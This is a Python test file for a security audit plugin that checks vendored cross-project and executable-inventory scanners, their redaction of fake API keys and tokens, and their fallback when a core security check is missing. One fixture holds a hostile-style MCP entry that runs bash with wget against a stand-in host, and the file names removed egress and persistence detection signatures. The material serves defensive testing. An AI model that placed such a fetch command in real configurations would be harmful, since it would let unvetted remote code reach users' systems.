"""Tests for vendored `audit/vendor/cross_checks.py` and `audit/vendor/executable_inventory.py`
plus packaged provenance validation (no external checkout) (§5, §6, §11, §12, §13)."""

from __future__ import annotations

import importlib.util
import json
import os
import sys
import unittest
from unittest import mock
from pathlib import Path

from tests import ensure_test_package

ensure_test_package()

from hermes_plugins.defuzz.audit.contract import (  # type: ignore[import-not-found] # noqa: E402
    CLASSIFICATION_INFO,
    CLASSIFICATION_REVIEW,
    CLASSIFICATION_WARNING,
    COVERAGE_COULD_NOT_VERIFY,
    COVERAGE_VERIFIED,
    adapt_component_result,
    compute_headline,
)
from hermes_plugins.defuzz.audit.vendor import (  # type: ignore[import-not-found] # noqa: E402
    cross_checks,
    executable_inventory,
)
from hermes_plugins.defuzz.audit.facts import (  # type: ignore[import-not-found] # noqa: E402
    resolve_mcp_entry_security_check,
)

REPO_ROOT = Path(__file__).resolve().parent.parent
FIXTURES_DIR = REPO_ROOT / "tests" / "fixtures" / "audit_cross"
VENDOR_DIR = REPO_ROOT / "audit" / "vendor"



class TestAuditVendorCrossAndExecInventory(unittest.TestCase):
    def test_packaged_vendor_provenance(self) -> None:
        from tests.vendor_provenance import assert_packaged_vendor
        assert_packaged_vendor(self, ['cross_checks.py', 'executable_inventory.py'])


    def test_cross_checks_fixture_through_contract_adapter(self) -> None:
        """Run `audit/vendor/cross_checks.py` on `cross_checks_sample.json` and adapt via `audit.contract`."""
        fixture_path = FIXTURES_DIR / "cross_checks_sample.json"
        payload = json.loads(fixture_path.read_text(encoding="utf-8"))

        raw_res = cross_checks.run(payload)
        self.assertTrue(raw_res["ok"])
        self.assertEqual(raw_res["status"], "pass")
        self.assertEqual(raw_res["coverage"], COVERAGE_VERIFIED)
        self.assertEqual(raw_res["classification"], CLASSIFICATION_WARNING)

        adapted = adapt_component_result(raw_res, component_id="cross_checks")
        self.assertEqual(adapted["coverage"], COVERAGE_VERIFIED)
        self.assertEqual(adapted["classification"], CLASSIFICATION_WARNING)

        rule_ids = {f["id"] for f in adapted["findings"]}
        self.assertIn("cross_checks.nested_repo", rule_ids)
        self.assertIn("cross_checks.parent_context_injected", rule_ids)
        self.assertIn("cross_checks.parent_context_blocked_by_git_boundary", rule_ids)
        self.assertIn("cross_checks.cross_project_symlink", rule_ids)
        self.assertIn("cross_checks.cross_project_editable_install", rule_ids)
        self.assertIn("cross_checks.memory_entry_multi_project_overlap", rule_ids)
        self.assertIn("cross_checks.skill_duplicate_exact", rule_ids)
        self.assertIn("cross_checks.memory_duplicate_exact_across_profiles", rule_ids)
        self.assertIn("cross_checks.whole_profile_exact_duplicate", rule_ids)

        # Verify survivor rule on whole_profile_exact_duplicate: `default` is active & default -> survivor,
        # `clone_old` is the only archive candidate and `selected_by_default` is False!
        whole_dup = next(f for f in adapted["findings"] if f["id"] == "cross_checks.whole_profile_exact_duplicate")
        self.assertEqual(whole_dup["evidence"]["survivor"], "default")
        cands = whole_dup["evidence"]["archive_candidates"]
        self.assertEqual(len(cands), 1)
        self.assertEqual(cands[0]["name"], "clone_old")
        self.assertFalse(cands[0]["selected_by_default"])

    def test_executable_inventory_fixture_through_contract_adapter(self) -> None:
        """Run `audit/vendor/executable_inventory.py` on `executable_inventory_sample.json` and verify redaction."""
        fixture_path = FIXTURES_DIR / "executable_inventory_sample.json"
        payload = json.loads(fixture_path.read_text(encoding="utf-8"))

        # Without Hermes core's shape check the declarations cannot be claimed clean.
        unchecked = adapt_component_result(executable_inventory.run(payload), component_id="executable_inventory")
        self.assertEqual(unchecked["coverage"], COVERAGE_COULD_NOT_VERIFY)
        self.assertFalse(compute_headline(component_results=[unchecked])["can_claim_clean"])

        # The fixture's unsafe entry is project-relative, not an IOC, so a no-issue check isolates redaction.
        raw_res = executable_inventory.run(payload, entry_security_check=lambda name, entry: [])
        serialized = json.dumps(raw_res)
        # Ensure all secrets in the fixture were scrubbed
        self.assertNotIn("sk-secret1234567890abcdef", serialized)
        self.assertNotIn("topsecretpw", serialized)
        self.assertNotIn("secret_key_999", serialized)
        self.assertNotIn("whsec_super_secret", serialized)
        self.assertNotIn("ghp_1234567890abcdefghijklmnopqrstuv", serialized)

        adapted = adapt_component_result(raw_res, component_id="executable_inventory")
        self.assertEqual(adapted["coverage"], COVERAGE_VERIFIED)
        self.assertEqual(adapted["classification"], CLASSIFICATION_WARNING)

        rule_ids = {f["id"] for f in adapted["findings"]}
        self.assertIn("executable_inventory.plugin_manifest", rule_ids)
        self.assertIn("executable_inventory.shell_hook_declaration", rule_ids)
        self.assertIn("executable_inventory.outbound_webhook_declaration", rule_ids)
        self.assertIn("executable_inventory.mcp_server_declaration", rule_ids)
        self.assertIn("executable_inventory.mcp_unsafe_declaration", rule_ids)

        headline = compute_headline(component_results=[adapted])
        self.assertEqual(headline["classification"], CLASSIFICATION_WARNING)
        self.assertFalse(headline["can_claim_clean"])


class TestMcpEntrySecurityCheckResolution(unittest.TestCase):
    """The IOC / shell egress / persistence list lives in Hermes core, never in this plugin."""

    def test_injected_check_wins(self) -> None:
        def check(name: str, entry: dict) -> list[str]:
            return []

        self.assertIs(resolve_mcp_entry_security_check(check_fn=check), check)

    def test_core_unavailable_resolves_to_none(self) -> None:
        with mock.patch.dict(sys.modules, {"hermes_cli.mcp_security": None}):
            self.assertIsNone(resolve_mcp_entry_security_check())

    def test_vendored_inventory_carries_no_signature_list(self) -> None:
        text = (VENDOR_DIR / "executable_inventory.py").read_text(encoding="utf-8")
        for removed in ("_IOC_SUBSTRINGS", "_SHELL_INTERPRETERS", "_EGRESS_OR_PERSISTENCE_RE"):
            self.assertNotIn(removed, text)

    def test_missing_public_security_api_reports_unknown(self) -> None:
        check = resolve_mcp_entry_security_check()
        self.assertIsNone(check)
        res = executable_inventory.run(
            {"profiles": [{"profile": "p", "config_path": "/x/config.yaml", "config_data": {"mcp_servers": {
                "egress": {"command": "bash", "args": ["-c", "wget -q -O- http://e.example/p"]},
                "benign": {"command": "node", "args": ["server.js"]},
            }}}]},
            entry_security_check=check,
        )
        self.assertEqual(res["coverage"], COVERAGE_COULD_NOT_VERIFY)
        self.assertFalse(compute_headline(component_results=[adapt_component_result(res, component_id="executable_inventory")])["can_claim_clean"])


if __name__ == "__main__":
    unittest.main()
